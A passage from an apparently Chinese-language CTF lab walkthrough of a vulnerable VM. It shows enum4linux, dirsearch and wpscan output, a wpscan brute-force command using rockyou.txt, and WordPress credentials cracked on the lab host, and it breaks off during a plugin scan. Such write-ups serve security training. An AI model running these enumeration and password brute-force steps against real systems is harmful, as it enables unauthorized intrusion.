class="line"><span class="string">S-1-22-1-1005 Unix User\SHayslett (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1006 Unix User\MBassin (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1007 Unix User\JBare (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1008 Unix User\LSolum (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1009 Unix User\IChadwick (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1010 Unix User\MFrei (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1011 Unix User\SStroud (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1012 Unix User\CCeaser (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1013 Unix User\JKanode (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1014 Unix User\CJoo (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1015 Unix User\Eeth (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1016 Unix User\LSolum2 (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1017 Unix User\JLipps (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1018 Unix User\jamie (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1019 Unix User\Sam (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1020 Unix User\Drew (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1021 Unix User\jess (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1022 Unix User\SHAY (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1023 Unix User\Taylor (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1024 Unix User\mel (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1025 Unix User\kai (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1026 Unix User\zoe (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1027 Unix User\NATHAN (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1028 Unix User\www (Local User)</span></span><br><span class="line"><span class="string">S-1-22-1-1029 Unix User\elly (Local User)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;                                                                                                                                   </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)                                                                                                                                                                          </span></span><br><span class="line"><span class="string">S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-32 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;                                                                                                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                                           </span></span><br><span class="line"><span class="string">S-1-5-32-545 BUILTIN\Users (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-546 BUILTIN\Guests (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-547 BUILTIN\Power Users (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-548 BUILTIN\Account Operators (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-549 BUILTIN\Server Operators (Local Group)</span></span><br><span class="line"><span class="string">S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==============================( Getting printer info for 192.168.159.22 )==============================</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">No printers returned.                                                                                                                                                                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enum4linux complete on Mon Dec  9 09:15:28 2024</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>得到了一些用户名</p>
<p>另外，SMB 匿名登录，从 kathy下的 backup 文件夹得 vsftpd.conf 和
wordpress-4.tar.gz，推测 web 应该部署了 wordpress
，没找到其他可用信息</p>
<h2 id="端口">5. 666 端口</h2>
<p>WEB 访问乱码，由于是 PK 开头，推测可能是个 ZIP 压缩包</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102115401.jpg" /></p>
<p>鼠标右键保存为 zip 文件后解压得</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102116839.jpg" /></p>
<p>后期提权提示？</p>
<p>注，前后靶机 IP 不一致是 VM 关机重启找不到 IP
了（网卡出问题了）……后面换 VirtualBox 了</p>
<h2 id="web-信息收集">6. WEB 信息收集</h2>
<ul>
<li>http://10.0.3.35:12380/</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102200083.jpg" /></p>
<p>目录扫描没扫到什么……</p>
<ul>
<li>https://10.0.3.35:12380/</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102201382.jpg" /></p>
<p>扫目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://10.0.3.35:12380/&quot; -e php,txt -t 50 2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 9922</span><br><span class="line"></span><br><span class="line">Output File: /root/reports/https_10.0.3.35_12380/__24-12-10_03-55-30.txt</span><br><span class="line"></span><br><span class="line">Target: https://10.0.3.35:12380/</span><br><span class="line"></span><br><span class="line">[03:55:30] Starting: </span><br><span class="line">[03:55:33] 403 -  302B  - /.htaccess_extra                                  </span><br><span class="line">[03:55:33] 403 -  298B  - /.ht_wsr.txt                                      </span><br><span class="line">[03:55:33] 403 -  299B  - /.htaccessOLD                                     </span><br><span class="line">[03:55:33] 403 -  301B  - /.htaccess.bak1                                   </span><br><span class="line">[03:55:33] 403 -  301B  - /.htaccess.orig                                   </span><br><span class="line">[03:55:33] 403 -  301B  - /.htaccess.save                                   </span><br><span class="line">[03:55:33] 403 -  299B  - /.htaccessBAK                                     </span><br><span class="line">[03:55:33] 403 -  300B  - /.htaccessOLD2                                    </span><br><span class="line">[03:55:33] 403 -  303B  - /.htaccess.sample                                 </span><br><span class="line">[03:55:33] 403 -  291B  - /.htm</span><br><span class="line">[03:55:33] 403 -  301B  - /.htaccess_orig                                   </span><br><span class="line">[03:55:33] 403 -  298B  - /.httr-oauth                                      </span><br><span class="line">[03:55:33] 403 -  297B  - /.htpasswds</span><br><span class="line">[03:55:33] 403 -  299B  - /.htaccess_sc                                     </span><br><span class="line">[03:55:33] 403 -  292B  - /.html                                            </span><br><span class="line">[03:55:33] 403 -  301B  - /.htpasswd_test                                   </span><br><span class="line">[03:55:35] 403 -  292B  - /.php3                                            </span><br><span class="line">[03:55:35] 403 -  291B  - /.php                                             </span><br><span class="line">[03:56:09] 301 -  321B  - /javascript  -&gt;  https://10.0.3.35:12380/javascript/          </span><br><span class="line">[03:56:20] 301 -  321B  - /phpmyadmin  -&gt;  https://10.0.3.35:12380/phpmyadmin/</span><br><span class="line">[03:56:21] 200 -    3KB - /phpmyadmin/                                      </span><br><span class="line">[03:56:21] 200 -    3KB - /phpmyadmin/index.php                             </span><br><span class="line">[03:56:21] 200 -    3KB - /phpmyadmin/doc/html/index.html                   </span><br><span class="line">[03:56:26] 200 -   59B  - /robots.txt                                       </span><br><span class="line">[03:56:28] 403 -  301B  - /server-status/                                   </span><br><span class="line">[03:56:28] 403 -  300B  - /server-status                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed                  </span><br></pre></td></tr></table></figure>
<p>robots.txt 得</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin112233/</span><br><span class="line">Disallow: /blogblog/</span><br></pre></td></tr></table></figure>
<p>进一步访问 /blogblog/ 确认是 wordpress</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://10.0.3.35:12380/blogblog&quot; -e php,txt -t 50 2&gt;&amp;/dev/null                                              </span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 9922</span><br><span class="line"></span><br><span class="line">Output File: /root/reports/https_10.0.3.35_12380/_blogblog_24-12-10_03-58-45.txt</span><br><span class="line"></span><br><span class="line">Target: https://10.0.3.35:12380/</span><br><span class="line"></span><br><span class="line">[03:58:45] Starting: blogblog/                                                                                                                                                                                                              </span><br><span class="line">[03:58:49] 403 -  307B  - /blogblog/.ht_wsr.txt                             </span><br><span class="line">[03:58:49] 403 -  308B  - /blogblog/.htaccessOLD</span><br><span class="line">[03:58:49] 403 -  309B  - /blogblog/.htaccessOLD2                           </span><br><span class="line">[03:58:49] 403 -  310B  - /blogblog/.htaccess.bak1                          </span><br><span class="line">[03:58:49] 403 -  310B  - /blogblog/.htaccess.orig                          </span><br><span class="line">[03:58:49] 403 -  311B  - /blogblog/.htaccess_extra                         </span><br><span class="line">[03:58:49] 403 -  310B  - /blogblog/.htaccess.save</span><br><span class="line">[03:58:49] 403 -  308B  - /blogblog/.htaccessBAK                            </span><br><span class="line">[03:58:49] 403 -  301B  - /blogblog/.html                                   </span><br><span class="line">[03:58:49] 403 -  312B  - /blogblog/.htaccess.sample                        </span><br><span class="line">[03:58:49] 403 -  308B  - /blogblog/.htaccess_sc</span><br><span class="line">[03:58:50] 403 -  310B  - /blogblog/.htpasswd_test</span><br><span class="line">[03:58:50] 403 -  307B  - /blogblog/.httr-oauth</span><br><span class="line">[03:58:50] 403 -  300B  - /blogblog/.htm                                    </span><br><span class="line">[03:58:49] 403 -  310B  - /blogblog/.htaccess_orig                          </span><br><span class="line">[03:58:50] 403 -  306B  - /blogblog/.htpasswds                              </span><br><span class="line">[03:58:51] 403 -  300B  - /blogblog/.php                                    </span><br><span class="line">[03:58:51] 403 -  301B  - /blogblog/.php3</span><br><span class="line">[03:59:26] 301 -    0B  - /blogblog/index.php/login/  -&gt;  https://10.0.3.35:12380/blogblog/login/</span><br><span class="line">[03:59:25] 301 -    0B  - /blogblog/index.php  -&gt;  https://10.0.3.35:12380/blogblog/</span><br><span class="line">[03:59:29] 200 -    7KB - /blogblog/license.txt                             </span><br><span class="line">[03:59:43] 200 -    3KB - /blogblog/readme.html                             </span><br><span class="line">[03:59:59] 200 -    0B  - /blogblog/wp-config.php                           </span><br><span class="line">[03:59:59] 301 -  328B  - /blogblog/wp-admin  -&gt;  https://10.0.3.35:12380/blogblog/wp-admin/</span><br><span class="line">[03:59:59] 200 -    1B  - /blogblog/wp-admin/admin-ajax.php                 </span><br><span class="line">[03:59:59] 302 -    0B  - /blogblog/wp-admin/  -&gt;  https://10.0.3.35:12380/blogblog/wp-login.php?redirect_to=https%3A%2F%2F10.0.3.35%3A12380%2Fblogblog%2Fwp-admin%2F&amp;reauth=1</span><br><span class="line">[03:59:59] 500 -    3KB - /blogblog/wp-admin/setup-config.php               </span><br><span class="line">[03:59:59] 200 -  601B  - /blogblog/wp-admin/install.php</span><br><span class="line">[03:59:59] 301 -  330B  - /blogblog/wp-content  -&gt;  https://10.0.3.35:12380/blogblog/wp-content/</span><br><span class="line">[03:59:59] 200 -  496B  - /blogblog/wp-content/                             </span><br><span class="line">[03:59:59] 403 -  332B  - /blogblog/wp-content/plugins/akismet/admin.php    </span><br><span class="line">[03:59:59] 500 -    0B  - /blogblog/wp-includes/rss-functions.php           </span><br><span class="line">[03:59:59] 200 -  420B  - /blogblog/wp-content/uploads/                     </span><br><span class="line">[03:59:59] 403 -  334B  - /blogblog/wp-content/plugins/akismet/akismet.php  </span><br><span class="line">[03:59:59] 200 -    0B  - /blogblog/wp-cron.php                             </span><br><span class="line">[04:00:00] 200 -    1KB - /blogblog/wp-login.php                            </span><br><span class="line">[04:00:00] 302 -    0B  - /blogblog/wp-signup.php  -&gt;  https://10.0.3.35:12380/blogblog/wp-login.php?action=register</span><br><span class="line">[03:59:59] 301 -  331B  - /blogblog/wp-includes  -&gt;  https://10.0.3.35:12380/blogblog/wp-includes/</span><br><span class="line">[03:59:59] 500 -    0B  - /blogblog/wp-content/plugins/hello.php            </span><br><span class="line">[04:00:00] 200 -    2KB - /blogblog/wp-includes/                            </span><br><span class="line">[04:00:00] 405 -   42B  - /blogblog/xmlrpc.php                              </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>利用 wpscan 扫描下用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wpscan --url &quot;https://10.0.3.35:12380/blogblog/&quot;   --disable-tls-checks -e u                                 </span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.27</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: https://10.0.3.35:12380/blogblog/ [10.0.3.35]</span></span><br><span class="line"><span class="string">[+] Started: Tue Dec 10 04:21:29 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://10.0.3.35:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: https://10.0.3.35:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://10.0.3.35:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://10.0.3.35:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://10.0.3.35:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2024-03-13T00:00:00.000Z</span><br><span class="line"> | Readme: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 1.8</span><br><span class="line"> | Style URL: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a <span class="built_in">nice</span> , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:01 &lt;====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] John Smith</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] john</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] elly</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] barry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] heather</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] garry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] harry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] scott</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kathy</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tim</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Dec 10 04:21:35 2024</span><br><span class="line">[+] Requests Done: 72</span><br><span class="line">[+] Cached Requests: 6</span><br><span class="line">[+] Data Sent: 20.642 KB</span><br><span class="line">[+] Data Received: 291.941 KB</span><br><span class="line">[+] Memory used: 236.496 MB</span><br><span class="line">[+] Elapsed time: 00:00:05</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试破解用户密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;https://10.0.3.35:12380/blogblog/&quot;</span>   --disable-tls-checks --usernames barry --passwords Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>找到两个 barry/washere，kathy/coolgirl 登录后发现权限太低，没法反弹
shell</p>
<p>进一步扫描 plugin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 